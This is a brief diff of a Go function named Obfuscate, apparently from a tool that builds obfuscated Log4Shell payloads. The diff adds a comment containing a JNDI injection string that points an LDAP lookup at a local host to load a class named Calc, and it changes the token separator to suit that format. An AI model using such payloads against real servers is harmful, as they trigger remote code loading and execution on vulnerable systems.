@@ -32,10 +32,11 @@ func Obfuscate(raw string, token bool) (string, string) {
 	// add token to the end of class name
 	var rwt string // raw with token
 	if token {
+		// ${jndi:ldap://127.0.0.1:3890/Calc$token}
 		front := raw[:len(raw)-1]
 		token := randString(16)
 		last := string(raw[len(raw)-1])
-		raw = fmt.Sprintf("%s_%s%s", front, token, last)
+		raw = fmt.Sprintf("%s$%s%s", front, token, last)
 
 		rwt = raw
 		l = len(raw)
